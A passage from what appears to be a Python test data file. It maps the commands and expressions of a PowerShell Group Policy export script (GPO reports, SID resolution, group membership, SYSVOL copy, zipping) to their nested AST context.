            'Set-SectionProgress -Activity "Group membership" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Where-Object { $principals[$_].type -eq 'Group' }",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Expanding $($groupSids.Count) groups..."',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Get-ADGroupMember -Identity $gSid -Recursive -ErrorAction Stop",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "ForEach-Object { $_.SID.Value }",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "Get-Date -Format 'o'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'group-members.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'group-members.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Expanded: $groupsExpanded, Failed: $groupsFailed"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Group membership collection failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            'Set-SectionProgress -Activity "SYSVOL copy" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Join-Path $out 'SYSVOL-Policies'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "New-Item -ItemType Directory -Force -Path $dest",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "Out-Null",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction SilentlyContinue "
                "-ErrorVariable +srcErr"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
                "-ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "try",
            ),
        ),
        (
            (
                'Write-Warning "SYSVOL copy failed for policy folder $($pf.Name): '
                '$($_.Exception.Message)"'
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $src -File -ErrorAction SilentlyContinue",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "ForEach-Object { Copy-Item -LiteralPath $_.FullName -Destination $dest -Force "
                "-ErrorAction SilentlyContinue }"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Copy-Item -LiteralPath $_.FullName -Destination $dest -Force -ErrorAction "
                "SilentlyContinue"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $dest -Recurse -File -ErrorAction SilentlyContinue",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            'Write-Warning "SYSVOL copy produced no files: $detail"',
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            'Write-Progress -Activity "Export complete" -Completed',
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host "`nExport summary:`n Succeeded ($($successSections.Count)):"',
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host " - $s"',
            (
                "guard if ($DryRun) -> return",
                "foreach ($s in $successSections)",
            ),
        ),
        (
            'Write-Host " Failed ($($failedSections.Count)):"',
            (
                "guard if ($DryRun) -> return",
                "if ($failedSections.Count -gt 0) after []",
            ),
        ),
        (
            'Write-Host " - $s"',
            (
                "guard if ($DryRun) -> return",
                "if ($failedSections.Count -gt 0) after []",
                "foreach ($s in $failedSections)",
            ),
        ),
        (
            'Write-Host " All sections succeeded."',
            (
                "guard if ($DryRun) -> return",
                "else of [($failedSections.Count -gt 0)]",
            ),
        ),
        (
            "New-GpoExportZip -ExportPath $out",
            (
                "guard if ($DryRun) -> return",
                "if (-not $NoZip) after []",
            ),
        ),
        (
            "[System.IO.Compression.ZipFile]::Open($archive, 'Create')",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
            ),
        ),
        (
            "$f.FullName.Substring($rootLen).Replace('\\', '/')",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            "$f.FullName.Substring($rootLen)",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            (
                "[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile( $zip, "
                "$f.FullName, $entryName)"
            ),
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "finally",
            ),
        ),
        (
            '[System.IO.File]::WriteAllText($testFile, "test")',
            ("try",),
        ),
        (
            "[math]::Round($sysvolSize / 1MB, 2)",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            "[System.Collections.Generic.List[string]]::new()",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "[System.Collections.Generic.List[string]]::new()",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "[math]::Round(($Section / $totalSections) * 100)",
            (
                "guard if ($DryRun) -> return",
                "function Set-SectionProgress",
            ),
        ),
        (
            "[System.Collections.Generic.List[object]]::new()",
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $null; DisplayName = "
                "'(combined report)'; Stage = 'report-all' Error = $_.Exception.Message })"
            ),
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "[math]::Round(($sectionNum - 1 + ($i / $gpoCount)) / $totalSections * 100)",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
            ),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $gpo.Id.Guid; DisplayName = "
                "$gpo.DisplayName; Stage = 'report' Error = $_.Exception.Message })"
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$_.Name.Trim('{}')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            (
                "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ord"
                "inalIgnoreCase)"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$knownIds.Add($g.Id.Guid)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($g in $allGpos)",
            ),
        ),
        (
            "$gpc.Name.Trim('{}')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
            ),
        ),
        (
            "$knownIds.Contains($guid)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if-condition after []",
            ),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $guid; DisplayName = "
                "$gpc.displayName; Stage = 'enumerate' Error = 'GPC exists in AD but Get-GPO "
                "could not read it (Authenticated Users Read may be stripped)' })"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if (-not $knownIds.Contains($guid)) after []",
            ),
        ),
        (
            '$successSections.Add("GPO settings (XML reports)")',
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            (
                '$failedSections.Add("GPO settings: $($collectionErrors.Count) GPO(s) could '
                'not be collected (see collection-errors.json)")'
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            '$successSections.Add("GPO metadata")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("GPO metadata: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("Inheritance (gp-inheritance)")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("Inheritance (gp-inheritance): $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("OU tree")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("OU tree: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("AD sites")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("AD sites: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("WMI filters")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("WMI filters: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            (
                "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ord"
                "inalIgnoreCase)"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "[regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "[regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $metaPath) after []",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $metaPath) after []",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "$sidObj.Translate([System.Security.Principal.NTAccount])",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
                "try",
            ),
        ),
        (
            "$dom.DNSRoot.Split('.')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            "$dom.DNSRoot.Split('.')",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            '$successSections.Add("Principals (SID -> name)")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("Principals (SID -> name): $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("Group membership")',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            '$failedSections.Add("Group membership: $($_.Exception.Message)")',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            '$successSections.Add("SYSVOL copy (skipped)")',
            (
                "guard if ($DryRun) -> return",
                "if ($SkipSysvol) after []",
            ),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $pf.Name.Trim('{}'); "
                "DisplayName = $null; Stage = 'sysvol' Error = $_.Exception.Message })"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "$pf.Name.Trim('{}')",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            '$failedSections.Add("SYSVOL copy: $detail - GPP/cPassword detection will be BLIND")',
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            (
                "$collectionErrors.Add([pscustomobject]@{ GpoId = $null; DisplayName = $null; "
                "Stage = 'sysvol'; Error = $detail })"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            '$successSections.Add("SYSVOL copy ($copiedCount files)")',
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "if ($sysvolErrors -eq 0) after [($policyFolders.Count -eq 0 -or "
                    "$copiedCount -eq 0)]"
                ),
            ),
        ),
        (
            (
                '$failedSections.Add("SYSVOL copy: $sysvolErrors policy folder(s) inaccessible '
                '(see collection-errors.json)")'
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            "$zipEnumErr.Count",
            (
                "function New-GpoExportZip",
                "try",
                "if ($zipEnumErr) after []",
            ),
        ),
        (
            "$ExportPath.Length",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
            ),
        ),
        (
            "$f.FullName",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            "$f.FullName",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
                "try",
                "foreach ($f in $diskFiles)",
            ),
        ),
        (
            "$diskFiles.Count",
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "function New-GpoExportZip",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "function New-GpoExportZip",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            ("catch []",),
        ),
        (
            "$_.Exception",
            ("catch []",),
        ),
        (
            "$dom.DNSRoot",
            (),
        ),
        (
            "$allGpos.Count",
            (),
        ),
        (
            "@(Get-ADOrganizationalUnit -Filter *).Count",
            (),
        ),
        (
            (
                "@(Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
                "'msWMI-Name' -ErrorAction SilentlyContinue).Count"
            ),
            (),
        ),
        (
            (
                "@(Get-ADObject -SearchBase "
                '"CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '
                '"(objectClass=site)" -ErrorAction SilentlyContinue).Count'
            ),
            (),
        ),
        (
            "(Get-ADRootDSE).configurationNamingContext",
            (),
        ),
        (
            "$dom.DNSRoot",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            "$dom.DNSRoot",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            (
                "(Get-ChildItem $src -Recurse -File -ErrorAction SilentlyContinue | "
                "Measure-Object -Property Length -Sum).Sum"
            ),
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            "$dom.DNSRoot",
            ("if ($DryRun) after []",),
        ),
        (
            "$dom.DNSRoot",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$gpo.DisplayName",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
            ),
        ),
        (
            "$gpo.Id",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            "$gpo.Id",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            "$gpo.Id.Guid",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$gpo.Id",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$gpo.DisplayName",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$gpo.DisplayName",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$gpo.Id",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            "$dom.DistinguishedName",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$_.Name",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "$_.displayName",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "[System.StringComparer]::OrdinalIgnoreCase",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$g.Id.Guid",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($g in $allGpos)",
            ),
        ),
        (
            "$g.Id",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($g in $allGpos)",
            ),
        ),
        (
            "$gpc.Name",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
            ),
        ),
        (
            "$gpc.displayName",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if (-not $knownIds.Contains($guid)) after []",
            ),
        ),
        (
            "$gpc.displayName",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if (-not $knownIds.Contains($guid)) after []",
                "if-condition after []",
            ),
        ),
        (
            "$gpc.displayName",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if (-not $knownIds.Contains($guid)) after []",
                "if ($gpc.displayName) after []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$collectionErrors.Count",
            (
                "guard if ($DryRun) -> return",
                "if-condition after []",
            ),
        ),
        (
            "$collectionErrors.Count",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "$_.User.DSVersion",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.User",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.User.SysvolVersion",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.User",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.Computer.DSVersion",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.Computer",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.Computer.SysvolVersion",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.Computer",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.WmiFilter.Name",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.WmiFilter",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$dom.DistinguishedName",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$targets.Count",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$g.Path",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "$g.Name",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "$g.ContainerType",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "$g.GpoInheritanceBlocked",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "$g.InheritedGpoLinks",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "(Get-ADRootDSE).configurationNamingContext",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.'msWMI-Name'",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.'msWMI-Parm2'",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "[System.StringComparer]::OrdinalIgnoreCase",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$f.FullName",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            "$m.Value",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "$m.Value",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $metaPath) after []",
                "try",
                "foreach ($m in [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+'))",
            ),
        ),
        (
            "$allSids.Count",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$sidObj.Translate([System.Security.Principal.NTAccount]).Value",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
                "try",
            ),
        ),
        (
            "$principals[$_].type",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$domainSids.Count",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "$domainSids.Count",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
            ),
        ),
        (
            "$obj.sAMAccountName",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
                "if-condition after []",
            ),
        ),
        (
            "$obj.sAMAccountName",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
                "if ($obj.sAMAccountName) after []",
            ),
        ),
        (
            "$obj.Name",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
                "else of [($obj.sAMAccountName)]",
            ),
        ),
        (
            "$obj.objectClass",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            "$dom.DNSRoot",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            "$dom.DNSRoot",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            "$dom.DNSRoot",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$principals.Keys",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$principals[$_].type",
            (
                "guard if ($DryRun) -> return",
                "try",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$groupSids.Count",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$principals[$gSid].name",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
            ),
        ),
        (
            "$_.SID.Value",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "$_.SID",
            (
                "guard if ($DryRun) -> return",
                "try",
